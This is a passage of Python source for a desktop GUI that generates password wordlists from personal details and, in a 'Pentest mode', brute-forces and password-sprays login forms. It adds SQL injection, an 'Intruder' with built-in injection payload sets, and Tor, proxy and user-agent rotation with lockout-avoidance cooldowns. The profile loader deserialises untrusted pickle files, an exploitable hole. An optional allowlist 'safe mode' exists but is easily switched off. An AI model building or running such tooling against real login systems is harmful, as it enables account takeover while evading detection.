		self.flow_steps: list[dict] = []
		self.var_wkhtmltopdf_path = tk.StringVar(value="wkhtmltopdf")

		# Flow Builder
		flow = ttk.LabelFrame(main, text="Flow Builder (pre-login multi-step)")
		flow.pack(fill=tk.BOTH, expand=False, **padding)
		rowf = 0
		chk = ttk.Checkbutton(flow, text="Enable flow", variable=self.var_flow_enabled)
		chk.grid(row=rowf, column=0, sticky="w", padx=4, pady=4)
		chk2 = ttk.Checkbutton(flow, text="Run per attempt", variable=self.var_flow_per_attempt)
		chk2.grid(row=rowf, column=1, sticky="w", padx=4, pady=4)
		rowf += 1
		cols = ("#", "method", "url", "extract")
		self.flow_view = ttk.Treeview(flow, columns=cols, show='headings', height=5)
		for c, w in zip(cols, (40, 80, 500, 200)):
			self.flow_view.heading(c, text=c)
			self.flow_view.column(c, width=w, anchor='w')
		self.flow_view.grid(row=rowf, column=0, columnspan=8, sticky="we", padx=4)
		rowf += 1
		fb = ttk.Frame(flow)
		fb.grid(row=rowf, column=0, columnspan=8, sticky="w")
		ttk.Button(fb, text="Add GET", command=lambda: self.on_flow_add('GET')).pack(side=tk.LEFT, padx=4)
		ttk.Button(fb, text="Add POST", command=lambda: self.on_flow_add('POST')).pack(side=tk.LEFT, padx=4)
		ttk.Button(fb, text="Edit", command=self.on_flow_edit).pack(side=tk.LEFT, padx=12)
		ttk.Button(fb, text="Remove", command=self.on_flow_remove).pack(side=tk.LEFT, padx=4)
		ttk.Button(fb, text="Up", command=lambda: self.on_flow_move(-1)).pack(side=tk.LEFT, padx=12)
		ttk.Button(fb, text="Down", command=lambda: self.on_flow_move(1)).pack(side=tk.LEFT, padx=4)
		for i in range(0, 8):
			flow.grid_columnconfigure(i, weight=1)

		# Notes
		notes = ttk.LabelFrame(main, text="Analyst Notes (included in HTML/PDF)")
		notes.pack(fill=tk.BOTH, expand=True, **padding)
		self.notes_text = scrolledtext.ScrolledText(notes, height=6)
		self.notes_text.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)

		# HTTP Auth
		authf = ttk.LabelFrame(main, text="HTTP Authentication")
		authf.pack(fill=tk.X, **padding)
		self._add_labeled_combobox(authf, "Auth type", self.var_auth_type, ["None","Basic","Digest","NTLM"], row=0, col=0)
		self._add_labeled_entry(authf, "Auth username", self.var_auth_user, row=0, col=2)
		self._add_labeled_entry(authf, "Auth password", self.var_auth_pass, row=0, col=4)
		self._add_labeled_entry(authf, "Auth domain (NTLM)", self.var_auth_domain, row=0, col=6)
		for i in range(0, 8):
			authf.grid_columnconfigure(i, weight=1)

		# Intruder
		intr = ttk.LabelFrame(main, text="Intruder")
		intr.pack(fill=tk.X, **padding)
		self._add_labeled_check(intr, "Enable Intruder", self.var_intruder_enabled, row=0, col=0)
		self._add_labeled_combobox(intr, "Mode", self.var_intruder_mode, ["sniper","pitchfork","clusterbomb"], row=0, col=2)
		self._add_labeled_entry(intr, "Markers (csv)", self.var_intruder_markers, row=0, col=4)
		self._add_labeled_entry(intr, "Single marker (compat)", self.var_intruder_marker, row=0, col=6)
		self._add_labeled_entry(intr, "Payloads file (compat)", self.var_intruder_payloads_file, row=1, col=0)
		self._add_labeled_combobox(intr, "Builtin (compat)", self.var_intruder_builtin, ["none","sqli","ssti","lfi","traversal","xss","cmdi"], row=1, col=2)
		lblm = ttk.Label(intr, text="Sets mapping (one per line: MARKER=source; source: file:/path or builtin:kind)")
		lblm.grid(row=2, column=0, sticky="w", padx=4, pady=2, columnspan=2)
		self.intr_sets_box = scrolledtext.ScrolledText(intr, height=4)
		self.intr_sets_box.grid(row=3, column=0, columnspan=8, sticky="we", padx=4, pady=4)
		btn_row = ttk.Frame(intr)
		btn_row.grid(row=4, column=0, columnspan=8, sticky="w")
		pp = ttk.Button(btn_row, text="Preview payloads", command=self.on_intruder_preview)
		pp.pack(side=tk.LEFT, padx=4)
		dd = ttk.Button(btn_row, text="Download seclists…", command=self.on_download_seclists)
		dd.pack(side=tk.LEFT, padx=4)
		# Results grid
		cols = ("#", "combo", "status", "len", "+/-", "ms", "succ", "fail")
		self.intr_view = ttk.Treeview(intr, columns=cols, show='headings', height=6)
		for c, w in zip(cols, (50, 420, 70, 70, 70, 70, 60, 60)):
			self.intr_view.heading(c, text=c)
			self.intr_view.column(c, width=w, anchor='w')
		self.intr_view.grid(row=5, column=0, columnspan=8, sticky='we', padx=4, pady=4)
		for i in range(0, 8):
			intr.grid_columnconfigure(i, weight=1)

	def _add_labeled_entry(self, master, label, var, row, col) -> None:
		ttk.Label(master, text=label).grid(row=row, column=col, sticky="e", padx=4, pady=4)
		entry = ttk.Entry(master, textvariable=var, width=28)
		entry.grid(row=row, column=col + 1, sticky="we", padx=4, pady=4)

	def _add_labeled_spinbox(self, master, label, var, row, col, from_, to) -> None:
		ttk.Label(master, text=label).grid(row=row, column=col, sticky="e", padx=4, pady=4)
		spin = ttk.Spinbox(master, textvariable=var, from_=from_, to=to, width=6)
		spin.grid(row=row, column=col + 1, sticky="w", padx=4, pady=4)

	def _choose_output_file(self) -> None:
		default = self.var_output_path.get() or self._default_output_path()
		initialdir = os.path.dirname(default) if os.path.dirname(default) else os.getcwd()
		def_ext = ".txt.gz" if self.var_gzip.get() else ".txt"
		filetypes = [("Gzip text", "*.txt.gz"), ("Text", "*.txt"), ("All files", "*.*")]
		path = filedialog.asksaveasfilename(initialdir=initialdir, initialfile=os.path.basename(default), defaultextension=def_ext, filetypes=filetypes)
		if path:
			self.var_output_path.set(path)

	def _process_ui_queue(self) -> None:
		try:
			while True:
				item = self.ui_queue.get_nowait()
				if item[0] == "progress":
					_, completed, total, elapsed = item
					percent = (completed / total * 100.0) if total > 0 else 0.0
					self.progress_var.set(percent)
					eta = (elapsed / completed * (total - completed)) if completed > 0 and total > completed else 0.0
					self.status_var.set(f"Progress: {completed:,}/{total:,}  |  {percent:0.2f}%  |  Elapsed: {self._fmt_sec(elapsed)}  |  ETA: {self._fmt_sec(eta)}")
				elif item[0] == "sample":
					_, sample = item
					self._append_preview(sample)
				elif item[0] == "log":
					_, msg = item
					self._append_preview(msg)
				elif item[0] == "done":
					_, completed, extra = item
					self._on_done(completed, extra)
				elif item[0] == "message":
					_, msg = item
					self.status_var.set(msg)
				elif item[0] == "intruder_result":
					row = item[1]
					self.intr_results.append(row)
					try:
						self.intr_view.insert('', 'end', values=(row.get('idx'), str(row.get('combo')), row.get('status'), row.get('len'), row.get('delta'), row.get('ms'), row.get('succ'), row.get('fail')))
					except Exception:
						pass
		except queue.Empty:
			pass
		self.root.after(150, self._process_ui_queue)

	def _append_preview(self, line: str) -> None:
		self.preview_text.configure(state=tk.NORMAL)
		self.preview_text.insert(tk.END, line + "\n")
		if float(self.preview_text.index('end-1c').split('.')[0]) > 5000:
			self.preview_text.delete('1.0', '2.0')
		self.preview_text.see(tk.END)
		self.preview_text.configure(state=tk.DISABLED)

	def _on_done(self, completed: int, extra: str = "") -> None:
		self.is_running = False
		self.cancel_requested = False
		self.btn_generate.configure(state=tk.NORMAL)
		self.btn_cancel.configure(state=tk.DISABLED)
		if self.total_estimated:
			self.progress_var.set(min(100.0, self.progress_var.get()))
		msg = extra or f"Completed. Processed {completed:,} items."
		self.status_var.set(msg)
		# Close log file if open
		self._close_log_file()
		try:
			if self.use_bootstrap:
				TbMessagebox.show_info("Done", msg)
			else:
				messagebox.showinfo("Done", msg)
		except Exception:
			pass

	def _fmt_sec(self, seconds: float) -> str:
		seconds = max(0.0, float(seconds))
		m, s = divmod(int(seconds), 60)
		h, m = divmod(m, 60)
		if h > 0:
			return f"{h}h {m}m {s}s"
		if m > 0:
			return f"{m}m {s}s"
		return f"{s}s"

	def _reset_metrics(self, pentest_enabled: bool) -> None:
		with self.metrics_lock:
			self.metrics["attempts"] = 0
			self.metrics["successes"] = 0
			self.metrics["failures"] = 0
			self.metrics["lockouts"] = 0
			self.metrics["errors"] = 0
			self.metrics["status_counts"] = {}
			self.metrics["latencies"].clear()
			self.metrics["attempt_timestamps"].clear()
			self.metrics["error_timestamps"].clear()
			self.metrics["start_time"] = time.time() if pentest_enabled else None

	def _record_attempt(self, latency_sec: float | None, status_code: int | None, success: bool, lockout: bool, error: bool) -> None:
		with self.metrics_lock:
			self.metrics["attempts"] += 1
			self.metrics["attempt_timestamps"].append(time.time())
			if success:
				self.metrics["successes"] += 1
			elif lockout:
				self.metrics["lockouts"] += 1
			elif error:
				self.metrics["errors"] += 1
				self.metrics["error_timestamps"].append(time.time())
			else:
				self.metrics["failures"] += 1
			if status_code is not None:
				self.metrics["status_counts"][status_code] = self.metrics["status_counts"].get(status_code, 0) + 1
			if latency_sec is not None:
				self.metrics["latencies"].append(latency_sec)

	def _refresh_reporting_ui(self) -> None:
		try:
			with self.metrics_lock:
				attempts = self.metrics["attempts"]
				successes = self.metrics["successes"]
				failures = self.metrics["failures"]
				lockouts = self.metrics["lockouts"]
				errors = self.metrics["errors"]
				status_counts = dict(self.metrics["status_counts"])  # copy
				latencies = list(self.metrics["latencies"])  # copy
				ts = list(self.metrics["attempt_timestamps"])  # copy
			# Update labels
			self.var_r_attempts.set(str(attempts))
			self.var_r_successes.set(str(successes))
			self.var_r_failures.set(str(failures))
			self.var_r_lockouts.set(str(lockouts))
			self.var_r_errors.set(str(errors))
			# RPS over last 10s
			now = time.time()
			recent = [t for t in ts if now - t <= 10.0]
			rps = len(recent) / 10.0 if recent else 0.0
			self.var_r_rps.set(f"{rps:.2f}")
			# Percentiles
			if latencies:
				ms = sorted([x * 1000.0 for x in latencies])
				def pctv(p):
					idx = max(0, min(len(ms) - 1, int(round(p * (len(ms) - 1)))))
					return int(ms[idx])
				self.var_r_latency_p50.set(f"{pctv(0.50)} ms")
				self.var_r_latency_p95.set(f"{pctv(0.95)} ms")
				self.var_r_latency_p99.set(f"{pctv(0.99)} ms")
			else:
				self.var_r_latency_p50.set("-")
				self.var_r_latency_p95.set("-")
				self.var_r_latency_p99.set("-")
			# Status table
			for row_id in self.codes_tree.get_children():
				self.codes_tree.delete(row_id)
			for code, count in sorted(status_counts.items()):
				self.codes_tree.insert("", tk.END, values=(code, count))
			# Time-series chart (RPS)
			self._draw_timeseries_chart()
		finally:
			self.root.after(750, self._refresh_reporting_ui)

	def _draw_timeseries_chart(self) -> None:
		canvas = self.chart_canvas
		if not canvas:
			return
		w = int(canvas.winfo_width() or 400)
		h = int(canvas.winfo_height() or 120)
		canvas.delete("all")
		# Build attempts/sec over last 60s
		now = time.time()
		with self.metrics_lock:
			ts = list(self.metrics["attempt_timestamps"])  # copy
		buckets = [0]*60
		for t in ts:
			d = int(now - t)
			if 0 <= d < 60:
				buckets[59 - d] += 1
		maxv = max(buckets) if buckets else 1
		maxv = max(maxv, 1)
		# axes
		canvas.create_line(30, h-20, w-10, h-20, fill="#ddd")
		canvas.create_line(30, 10, 30, h-20, fill="#ddd")
		# polyline
		if buckets:
			plot_w = w - 40
			plot_h = h - 30
			points = []
			for i, v in enumerate(buckets):
				x = 30 + (i/(len(buckets)-1)) * plot_w if len(buckets) > 1 else 30
				y = (h-20) - (v/maxv) * plot_h
				points.extend([x, y])
			canvas.create_line(points, fill="#2a7", width=2, smooth=True)
			# labels
			canvas.create_text(w-12, h-26, text=f"peak {maxv}/s", anchor="ne", fill="#555", font=("", 8))
			canvas.create_text(32, 12, text="RPS last 60s", anchor="nw", fill="#555", font=("", 9, "bold"))

	def _default_log_path(self) -> str:
		stamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
		return os.path.join(os.getcwd(), f"pentest-log-{stamp}.csv")

	def _open_log_file(self) -> None:
		path = self.var_log_file.get().strip() or self._default_log_path()
		mode = 'a' if self.var_log_append.get() else 'w'
		try:
			self._log_fp = open(path, mode, encoding='utf-8')
			if mode == 'w':
				self._log_fp.write("timestamp,username,password,status_code,latency_ms,success,lockout,error,proxy,ua\n")
		except Exception as exc:
			self._append_preview(f"Failed to open log file: {exc}")
			self._log_fp = None

	def _close_log_file(self) -> None:
		try:
			if self._log_fp:
				self._log_fp.flush()
				self._log_fp.close()
		except Exception:
			pass
		finally:
			self._log_fp = None

	def _log_line(self, parts: list) -> None:
		if not self._log_fp:
			return
		try:
			with self._log_lock:
				self._log_fp.write(",".join(str(p).replace('\n',' ').replace('\r',' ') for p in parts) + "\n")
		except Exception:
			pass

	def on_generate(self) -> None:
		if self.is_running:
			return
		try:
			min_len = int(self.var_min_len.get())
			max_len = int(self.var_max_len.get())
			if min_len <= 0 or max_len <= 0 or max_len < min_len:
				raise ValueError
		except Exception:
			messagebox.showerror("Invalid lengths", "Please provide valid positive min/max lengths (max >= min).")
			return

		pentest_enabled = bool(self.var_target_enabled.get())
		pentest_args = {}
		if pentest_enabled:
			if requests is None:
				messagebox.showerror("Missing dependency", "The 'requests' package is required for Pentest mode.")
				return
			url = self.var_target_url.get().strip()
			if not url:
				messagebox.showerror("Target URL", "Please enter the target URL.")
				return
			# Safe mode allowlist enforcement
			if self.var_safe_mode.get() and self.var_allowlist.get().strip():
				try:
					host = urlparse(url).hostname or ""
					allowed = False
					for pat in [p.strip() for p in self.var_allowlist.get().split(',') if p.strip()]:
						if pat.startswith('^') or pat.endswith('$'):
							import re as _re
							if _re.search(pat, host):
								allowed = True; break
						else:
							if pat in host:
								allowed = True; break
					if not allowed:
						messagebox.showerror("Safe Mode", f"Host '{host}' not in allowlist. Update allowlist to proceed.")
						return
				except Exception:
					pass
			username = self.var_username_value.get().strip()
			user_param = self.var_user_param.get().strip() or "username"
			pass_param = self.var_pass_param.get().strip() or "password"
			success_codes = self._parse_codes(self.var_success_codes.get())
			succ_re = self._compile_regex(self.var_success_regex.get())
			fail_re = self._compile_regex(self.var_failure_regex.get())
			extra_params = self._parse_extra_params(self.var_extra_params.get())
			qps = max(0.1, float(self.var_qps.get() or 5.0))
			headers = self._parse_headers_json(self.var_headers_json.get())
			cookies = self._parse_cookies(self.var_cookies.get())
			proxy = self.var_proxy_url.get().strip()
			proxies = {'http': proxy, 'https': proxy} if proxy else None
			verify_tls = bool(self.var_verify_tls.get())
			timeout = float(self.var_timeout.get() or 15.0)
			concurrency = max(1, int(self.var_concurrency.get() or 5))
			# Safe mode caps
			if self.var_safe_mode.get():
				qps = min(qps, float(self.var_safe_qps_cap.get() or 1.0))
				concurrency = min(concurrency, int(self.var_safe_concurrency_cap.get() or 2))
				self.var_lockout_jitter.set(True)
			# Flow guard for async engine
			if bool(self.var_async_engine.get()) and self.var_flow_enabled.get():
				messagebox.showwarning("Flow & Async", "Flow Builder currently runs only with the synchronous engine. Disable Async engine to use flows.")
			# Usernames collection
			usernames = self._collect_usernames(username)
			if not usernames:
				messagebox.showerror("Usernames", "Provide a username value or a usernames file, or enable pattern generation.")
				return
			# Build configuration
			pentest_args = {
				"enabled": True,
				"url": url,
				"protocol": (self.var_protocol.get() or "HTTP").upper(),
				"method": self.var_http_method.get().upper(),
				"username": username,
				"user_param": user_param,
				"pass_param": pass_param,
				"extra_params": extra_params,
				"success_codes": success_codes,
				"success_regex": succ_re,
				"failure_regex": fail_re,
				"qps": qps,
				"enable_sqli": bool(self.var_enable_sqli.get()),
				"sqli_field": self.var_sqli_field.get(),
				"headers": headers,
				"cookies": cookies,
				"proxies": proxies,
				"verify": verify_tls,
				"timeout": timeout,
				"concurrency": concurrency,
				# http auth
				"auth_type": self.var_auth_type.get(),
				"auth_user": self.var_auth_user.get(),
				"auth_pass": self.var_auth_pass.get(),
				"auth_domain": self.var_auth_domain.get(),
				# rotation
				"proxy_list": self._load_proxy_list_file(self.var_proxy_list_file.get()),
				"proxy_rotation": self.var_proxy_rotation.get(),
				"user_agents": self._load_user_agents(self.var_user_agent_list_file.get()),
				"ua_rotation": self.var_user_agent_rotation.get() if self.var_user_agent_rotate.get() else "none",
				# async engine
				"async_engine": bool(self.var_async_engine.get()),
				"http2": bool(self.var_http2.get()),
				"max_connections": int(self.var_max_connections.get() or 100),
				"retries": int(self.var_retries.get() or 2),
				"backoff_ms": int(self.var_backoff_ms.get() or 200),
				# checkpoint & auto form
				"checkpoint": {
					"enabled": bool(self.var_checkpoint_enabled.get()),
					"file": self.var_checkpoint_file.get().strip(),
					"resume": bool(self.var_resume_from_checkpoint.get()),
				},
				"auto_form": bool(self.var_auto_form.get()),
				"refresh_csrf": bool(self.var_refresh_csrf.get()),
				# pre-login
				"prelogin": {
					"enabled": bool(self.var_prelogin_enabled.get()),
					"urls": [u.strip() for u in (self.var_prelogin_urls.get() or '').split(',') if u.strip()],
					"per_attempt": bool(self.var_prelogin_per_attempt.get()),
					"headless_js": bool(self.var_prelogin_js.get()),
				},
				# template
				"body_mode": self.var_body_mode.get(),
				"raw_body": self.raw_body_text.get("1.0", 'end-1c'),
				# success signals
				"success_require_redirect": bool(self.var_success_require_redirect.get()),
				"success_length_gt": int(self.var_success_length_gt.get() or 0),
				# safe mode
				"safe_auto_pause": bool(self.var_safe_auto_pause.get()),
				# flow
				"flow_enabled": bool(self.var_flow_enabled.get()),
				"flow_per_attempt": bool(self.var_flow_per_attempt.get()),
				"flow_steps": list(self.flow_steps),
				# notes
				"notes": self.notes_text.get('1.0','end-1c') if hasattr(self, 'notes_text') else "",
				# intruder
				"intruder_enabled": bool(self.var_intruder_enabled.get()),
				"intruder_mode": (self.var_intruder_mode.get() or 'sniper'),
				"intruder_markers": [m.strip() for m in (self.var_intruder_markers.get() or '').split(',') if m.strip()],
				"intruder_marker": self.var_intruder_marker.get(),
				"intruder_payloads_file": self.var_intruder_payloads_file.get(),
				"intruder_builtin": self.var_intruder_builtin.get(),
				"intruder_sets_text": self.intr_sets_box.get('1.0','end-1c'),
			}

		mode = self.var_mode.get()
		if mode == "Brute-force":
			char_set = self._build_bruteforce_charset()
			n = len(char_set)
			if n <= 0:
				messagebox.showerror("Character set", "Character set is empty. Provide inputs or special characters.")
				return
			total_est = self._geom_series(n, min_len, max_len)
		elif mode == "Smart brute-force":
			total_est = self._estimate_smart_bruteforce_total(min_len, max_len)
		else:
			total_est = self._estimate_smart_total(min_len, max_len)

		# If spraying, override estimate to reflect usernames x passwords
		if pentest_enabled and pentest_args.get("spray_enabled"):
			total_est = len(pentest_args.get("usernames", [])) * len(pentest_args.get("spray_passwords", []))

		HARD_CAP = 25_000_000
		WARN_CAP = 5_000_000
		if total_est > HARD_CAP and mode == "Brute-force" and not pentest_enabled:
			messagebox.showwarning("Too large", f"Estimated {total_est:,} candidates which exceeds the hard cap of {HARD_CAP:,}. Reduce lengths or character set.")
			return
		if total_est > WARN_CAP and not pentest_enabled:
			proceed = messagebox.askyesno("Large generation", f"Estimated to generate about {total_est:,} candidates. This may take a long time and large disk space. Continue?")
			if not proceed:
				return

		# Prepare UI
		self.preview_text.configure(state=tk.NORMAL)
		self.preview_text.delete('1.0', tk.END)
		self.preview_text.configure(state=tk.DISABLED)
		self.progress_var = tk.DoubleVar(value=0.0)
		self.status_var = tk.StringVar(value="Starting…")
		self.generated_count = 0
		self.total_estimated = total_est
		self.start_time = time.time()
		self._reset_metrics(pentest_enabled)
		# Open log file if enabled
		if pentest_enabled and self.var_log_to_file.get():
			if not self.var_log_file.get().strip():
				self.var_log_file.set(self._default_log_path())
			self._open_log_file()
			self._log_line(["# start", datetime.now().isoformat(timespec='seconds'), self.var_target_url.get().strip()])
		# Reset artifacts
		self.captured_artifacts = []
		self._failures_captured = 0
		self.found_credentials = []

		# Start worker
		self.is_running = True
		self.cancel_requested = False
		self.btn_generate.configure(state=tk.DISABLED)
		self.btn_cancel.configure(state=tk.NORMAL)

		args = {
			"mode": mode,
			"min_len": min_len,
			"max_len": max_len,
			"gzip": self.var_gzip.get(),
			"output_path": self.var_output_path.get(),
			"pentest": pentest_args,
		}
		def _run_worker_safely():
			try:
				self._worker(args)
			except Exception as exc:
				try:
					self.ui_queue.put(("log", f"Fatal worker error: {exc}"))
					self.ui_queue.put(("done", 0, "Worker crashed; see logs"))
				except Exception:
					pass
		self.worker_thread = threading.Thread(target=_run_worker_safely, daemon=True)
		self.worker_thread.start()

	def on_cancel(self) -> None:
		if not self.is_running:
			return
		self.cancel_requested = True
		self.status_var.set("Canceling…")

	def on_close(self) -> None:
		# Graceful shutdown on window close
		if self.is_running:
			try:
				self.cancel_requested = True
				self.status_var.set("Canceling before exit…")
				if self.worker_thread and self.worker_thread.is_alive():
					self.worker_thread.join(timeout=3.0)
			except Exception:
				pass
		try:
			self.root.destroy()
		except Exception:
			os._exit(0)

	def on_save_profile(self) -> None:
		profile = {
			"name": self.var_name.get(),
			"surname": self.var_surname.get(),
			"city": self.var_city.get(),
			"birthdate": self.var_birthdate.get(),
			"min_len": self.var_min_len.get(),
			"max_len": self.var_max_len.get(),
			"special_chars": self.var_special_chars.get(),
			"include_digits": self.var_include_digits.get(),
			"include_uppercase": self.var_include_uppercase.get(),
			"mode": self.var_mode.get(),
			"gzip": self.var_gzip.get(),
			# Pentest
			"target_enabled": self.var_target_enabled.get(),
			"target_url": self.var_target_url.get(),
			"protocol": self.var_protocol.get(),
			"http_method": self.var_http_method.get(),
			"username_value": self.var_username_value.get(),
			"user_param": self.var_user_param.get(),
			"pass_param": self.var_pass_param.get(),
			"extra_params": self.var_extra_params.get(),
			"success_codes": self.var_success_codes.get(),
			"success_regex": self.var_success_regex.get(),
			"failure_regex": self.var_failure_regex.get(),
			"qps": self.var_qps.get(),
			"enable_sqli": self.var_enable_sqli.get(),
			"sqli_field": self.var_sqli_field.get(),
			"concurrency": self.var_concurrency.get(),
			"headers_json": self.var_headers_json.get(),
			"cookies": self.var_cookies.get(),
			"proxy_url": self.var_proxy_url.get(),
			"verify_tls": self.var_verify_tls.get(),
			"timeout": self.var_timeout.get(),
			# Usernames & spraying
			"usernames_file": self.var_usernames_file.get(),
			"email_domain": self.var_email_domain.get(),
			"generate_patterns": self.var_generate_patterns.get(),
			"lowercase_usernames": self.var_lowercase_usernames.get(),
			"common_aliases": self.var_common_aliases.get(),
			"spray_enabled": self.var_spray_enabled.get(),
			"spray_passwords_file": self.var_spray_passwords_file.get(),
			"spray_cooldown_min": self.var_spray_cooldown_min.get(),
			"spray_window_min": self.var_spray_window_min.get(),
			"spray_attempts_per_window": self.var_spray_attempts_per_window.get(),
			"spray_stop_on_success": self.var_spray_stop_on_success.get(),
			# Lockout
			"lockout_enabled": self.var_lockout_enabled.get(),
			"lockout_codes": self.var_lockout_codes.get(),
			"lockout_regex": self.var_lockout_regex.get(),
			"lockout_cooldown_min": self.var_lockout_cooldown_min.get(),
			"lockout_jitter": self.var_lockout_jitter.get(),
			# Rotation
			"tor_mode": self.var_tor_mode.get(),
			"tor_proxy": self.var_tor_proxy.get(),
			"proxy_list_file": self.var_proxy_list_file.get(),
			"proxy_rotation": self.var_proxy_rotation.get(),
			"user_agent_rotate": self.var_user_agent_rotate.get(),
			"user_agent_list_file": self.var_user_agent_list_file.get(),
			"user_agent_rotation": self.var_user_agent_rotation.get(),
			# async engine
			"async_engine": self.var_async_engine.get(),
			"http2": self.var_http2.get(),
			"max_connections": self.var_max_connections.get(),
			"retries": self.var_retries.get(),
			"backoff_ms": self.var_backoff_ms.get(),
			# checkpoint & auto form
			"checkpoint": {
				"enabled": bool(self.var_checkpoint_enabled.get()),
				"file": self.var_checkpoint_file.get().strip(),
				"resume": bool(self.var_resume_from_checkpoint.get()),
			},
			"auto_form": bool(self.var_auto_form.get()),
			"refresh_csrf": bool(self.var_refresh_csrf.get()),
			# pre-login
			"prelogin": {
				"enabled": bool(self.var_prelogin_enabled.get()),
				"urls": [u.strip() for u in (self.var_prelogin_urls.get() or '').split(',') if u.strip()],
				"per_attempt": bool(self.var_prelogin_per_attempt.get()),
				"headless_js": bool(self.var_prelogin_js.get()),
			},
			# template and success signals
			"body_mode": self.var_body_mode.get(),
			"raw_body": self.raw_body_text.get("1.0", 'end-1c'),
			"success_require_redirect": bool(self.var_success_require_redirect.get()),
			"success_length_gt": int(self.var_success_length_gt.get() or 0),
			# safe mode
			"safe_auto_pause": bool(self.var_safe_auto_pause.get()),
			# flow
			"flow_enabled": bool(self.var_flow_enabled.get()),
			"flow_per_attempt": bool(self.var_flow_per_attempt.get()),
			"flow_steps": list(self.flow_steps),
			# notes
			"notes": self.notes_text.get('1.0','end-1c') if hasattr(self, 'notes_text') else "",
			# http auth
			"auth_type": self.var_auth_type.get(),
			"auth_user": self.var_auth_user.get(),
			"auth_pass": self.var_auth_pass.get(),
			"auth_domain": self.var_auth_domain.get(),
			# intruder
			"intruder_enabled": bool(self.var_intruder_enabled.get()),
			"intruder_mode": (self.var_intruder_mode.get() or 'sniper'),
			"intruder_markers": [m.strip() for m in (self.var_intruder_markers.get() or '').split(',') if m.strip()],
			"intruder_marker": self.var_intruder_marker.get(),
			"intruder_payloads_file": self.var_intruder_payloads_file.get(),
			"intruder_builtin": self.var_intruder_builtin.get(),
			"intruder_sets_text": self.intr_sets_box.get('1.0','end-1c'),
		}
		path = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("Profile JSON", "*.json"), ("All files", "*.*")])
		if not path:
			return
		try:
			with open(path, "w", encoding="utf-8") as f:
				json.dump(profile, f, indent=2)
			self._info("Profile saved")
		except Exception as exc:
			messagebox.showerror("Save failed", str(exc))

	def on_load_profile(self) -> None:
		path = filedialog.askopenfilename(filetypes=[("Profile JSON", "*.json"), ("Legacy pickle", "*.pkl"), ("All files", "*.*")])
		if not path:
			return
		try:
			if path.endswith(".json"):
				with open(path, "r", encoding="utf-8") as f:
					profile = json.load(f)
			else:
				import pickle
				with open(path, "rb") as f:
					profile = pickle.load(f)
		except Exception as exc:
			messagebox.showerror("Load failed", f"Could not load profile: {exc}")
			return

		self.var_name.set(profile.get("name", ""))
		self.var_surname.set(profile.get("surname", ""))
		self.var_city.set(profile.get("city", ""))
		self.var_birthdate.set(profile.get("birthdate", ""))
		self.var_min_len.set(int(profile.get("min_len", 4)))
		self.var_max_len.set(int(profile.get("max_len", 6)))
		self.var_special_chars.set(profile.get("special_chars", "!@#$%_-"))
		self.var_include_digits.set(bool(profile.get("include_digits", True)))
		self.var_include_uppercase.set(bool(profile.get("include_uppercase", True)))
		self.var_mode.set(profile.get("mode", "Brute-force"))
		self.var_gzip.set(bool(profile.get("gzip", False)))

		self.var_target_enabled.set(bool(profile.get("target_enabled", False)))
		self.var_target_url.set(profile.get("target_url", ""))
		self.var_protocol.set(profile.get("protocol", "HTTP"))
		self.var_http_method.set(profile.get("http_method", "POST"))
		self.var_username_value.set(profile.get("username_value", ""))
		self.var_user_param.set(profile.get("user_param", "username"))
		self.var_pass_param.set(profile.get("pass_param", "password"))
		self.var_extra_params.set(profile.get("extra_params", ""))
		self.var_success_codes.set(profile.get("success_codes", "200,302"))
		self.var_success_regex.set(profile.get("success_regex", ""))
		self.var_failure_regex.set(profile.get("failure_regex", ""))
		self.var_qps.set(float(profile.get("qps", 5.0)))
		self.var_enable_sqli.set(bool(profile.get("enable_sqli", False)))
		self.var_sqli_field.set(profile.get("sqli_field", "password"))
		self.var_concurrency.set(int(profile.get("concurrency", 5)))
		self.var_headers_json.set(profile.get("headers_json", ""))
		self.var_cookies.set(profile.get("cookies", ""))
		self.var_proxy_url.set(profile.get("proxy_url", ""))
		self.var_verify_tls.set(bool(profile.get("verify_tls", True)))
		self.var_timeout.set(float(profile.get("timeout", 15.0)))
		# usernames & spraying
		self.var_usernames_file.set(profile.get("usernames_file", ""))
		if self.var_usernames_file.get():
			self.loaded_usernames = self._parse_list_file(self.var_usernames_file.get())
			self.var_usernames_count.set(f"loaded: {len(self.loaded_usernames)}")
		else:
			self.var_usernames_count.set("(none)")
		self.var_email_domain.set(profile.get("email_domain", ""))
		self.var_generate_patterns.set(bool(profile.get("generate_patterns", True)))
		self.var_lowercase_usernames.set(bool(profile.get("lowercase_usernames", True)))
		self.var_common_aliases.set(bool(profile.get("common_aliases", True)))
		self.var_spray_enabled.set(bool(profile.get("spray_enabled", False)))
		self.var_spray_passwords_file.set(profile.get("spray_passwords_file", ""))
		self.var_spray_cooldown_min.set(float(profile.get("spray_cooldown_min", 15.0)))
		self.var_spray_window_min.set(float(profile.get("spray_window_min", 60.0)))
		self.var_spray_attempts_per_window.set(int(profile.get("spray_attempts_per_window", 1)))
		self.var_spray_stop_on_success.set(bool(profile.get("spray_stop_on_success", True)))
		# lockout
		self.var_lockout_enabled.set(bool(profile.get("lockout_enabled", True)))
		self.var_lockout_codes.set(profile.get("lockout_codes", "429,423,403"))
		self.var_lockout_regex.set(profile.get("lockout_regex", "account locked|too many attempts|temporarily blocked|captcha"))
		self.var_lockout_cooldown_min.set(float(profile.get("lockout_cooldown_min", 30.0)))
		self.var_lockout_jitter.set(bool(profile.get("lockout_jitter", True)))
		# rotation load
		self.var_tor_mode.set(bool(profile.get("tor_mode", False)))
		self.var_tor_proxy.set(profile.get("tor_proxy", "socks5h://127.0.0.1:9050"))
		self.var_proxy_list_file.set(profile.get("proxy_list_file", ""))
		if self.var_proxy_list_file.get():
			self.loaded_proxies = self._parse_list_file(self.var_proxy_list_file.get())
		self.var_proxy_rotation.set(profile.get("proxy_rotation", "per_request"))
		self.var_user_agent_rotate.set(bool(profile.get("user_agent_rotate", False)))
		self.var_user_agent_list_file.set(profile.get("user_agent_list_file", ""))
		if self.var_user_agent_list_file.get():
			self.loaded_user_agents = self._parse_list_file(self.var_user_agent_list_file.get())
		self.var_user_agent_rotation.set(profile.get("user_agent_rotation", "per_request"))
		# async engine
		self.var_async_engine.set(bool(profile.get("async_engine", False)))
		self.var_http2.set(bool(profile.get("http2", True)))
		self.var_max_connections.set(int(profile.get("max_connections", 100)))
		self.var_retries.set(int(profile.get("retries", 2)))
		self.var_backoff_ms.set(int(profile.get("backoff_ms", 200)))
		# checkpoint & auto form
